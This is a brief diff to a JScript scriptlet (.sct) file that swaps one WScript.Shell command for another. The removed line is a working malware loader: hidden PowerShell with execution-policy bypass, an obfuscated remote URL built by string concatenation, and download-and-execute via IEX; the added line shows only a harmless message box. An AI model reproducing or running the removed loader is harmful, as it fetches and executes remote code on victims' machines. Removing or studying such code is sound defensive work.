@@ -6,7 +6,7 @@
     <script language="JScript">
       <![CDATA[
         var shell = new ActiveXObject("WScript.Shell");
-        shell.Run("powershell.exe -windowstyle hidden -nop -exec bypass -c \"$w=New-Object Net.WebClient;$u=('https'+'://nopas'+'te.net/vu'+'Pp'+'xm'+'Y1bq');IEX $w.DownloadString($u)\"");
+        shell.Run("powershell.exe -WindowStyle Hidden -Command \"[System.Windows.Forms.MessageBox]::Show('Hello from PowerShell!', 'SCT Demo')\"");
       ]]>
     </script>
   </registration>
